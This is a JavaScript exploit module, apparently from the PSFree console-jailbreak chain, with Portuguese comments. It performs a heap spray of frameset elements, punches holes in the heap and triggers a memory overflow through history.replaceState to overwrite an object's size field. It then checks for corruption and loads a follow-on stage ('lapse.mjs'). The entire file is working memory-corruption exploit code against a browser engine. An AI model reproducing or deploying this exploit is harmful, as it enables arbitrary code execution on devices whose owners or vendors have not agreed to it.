/* PSFree Modular: Frameset OOM Detector
   Target: 1MB Contiguous Object (_size + _data)
*/

import { log, sleep } from './module/utils.mjs';

// Configuração do Exploit
const BASE_OFFSET = 709520; 
const OVERFLOW_AMT = 1024 * 64; 

// Configuração da Vítima (1MB)
// Total 1MB - 8 bytes header = Dados
const TARGET_BYTES = 1024 * 1024;
const ELEMENT_COUNT = (TARGET_BYTES - 8) / 8;
const ROWS_STRING = ",".repeat(ELEMENT_COUNT - 1);

var victims = [];

async function main() {
    log("=== PSFree: Frameset OOM Detector ===");
    log("Estratégia: Corromper '_size' e detectar Erro de Memória.");

    // 1. WARMUP (Do arquivo psfree.mjs)
    // Prepara o alocador para receber objetos grandes
    log("[1] Aquecendo alocador...");
    let dummy = "W".repeat(BASE_OFFSET);
    history.replaceState(dummy, "warmup", null);
    await sleep(100);

    // Tenta alinhamentos finos de ponte (0, 8, 16 bytes)
    // Para garantir que o 0x01 caia EXATAMENTE no _size
    for (let bridge = 0; bridge <= 16; bridge += 8) {
        log(`\n[TESTE] Ponte de Zeros: ${bridge} bytes`);
        
        await prepare_heap();
        
        // Dispara
        let success = await trigger_exploit(bridge);
        
        if (success) {
            log("!!! RCE PRIMITIVE CONFIRMED !!!", 'green');
            log("O sistema tentou alocar memória infinita. Temos controle.", 'green');
            // Aqui carregaríamos o Lapse
            await import('./lapse.mjs');
            return;
        }
        
        // Limpa
        victims = [];
        await forceGC();
    }
    
    log("Falha. Tente reiniciar.", 'red');
}

async function prepare_heap() {
    victims = [];
    const SPRAY_COUNT = 60;

    // SPRAY FRAMESET
    for(let i=0; i<SPRAY_COUNT; i++) {
        let fset = document.createElement('frameset');
        fset.rows = ROWS_STRING;
        victims.push(fset);
    }

    // BURACOS
    for(let i=0; i<SPRAY_COUNT; i+=2) {
        victims[i].rows = ""; 
        victims[i] = null;
    }
    await forceGC();
}

async function trigger_exploit(bridgeSize) {
    try {
        let buffer = "A".repeat(BASE_OFFSET);
        
        // A Ponte: Zeros para alinhar ou pular padding
        buffer += "\u0000".repeat(bridgeSize);
        
        // O Ataque: 0x01 no _size
        buffer += "\x01".repeat(OVERFLOW_AMT);
        
        history.replaceState({}, "pwn", "/" + buffer);

        return check_victims();

    } catch(e) {
        log("Erro no Trigger: " + e.message);
        return false;
    }
}

function check_victims() {
    for(let i=1; i<victims.length; i+=2) {
        let fset = victims[i];
        if(!fset) continue;

        try {
            // Tenta ler a propriedade.
            // Se _size for normal, lê rápido.
            // Se _size for 0x0101... (Gigante), vai tentar alocar string gigante.
            let s = fset.rows;
            
            // Se leu e o tamanho está errado (mas coube na memória)
            if (s.length !== ROWS_STRING.length) {
                log(`[JACKPOT] Tamanho alterado: ${s.length}`, 'green');
                return true;
            }

        } catch(e) {
            // AQUI É A VITÓRIA REAL
            // Se der erro "Out of Memory" ou "String too long"
            log(`[JACKPOT] Erro ao ler Frameset ${i}: ${e.message}`, 'green');
            return true;
        }
    }
    return false;
}

async function forceGC() {
    try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
    return new Promise(r => setTimeout(r, 500));
}

main();
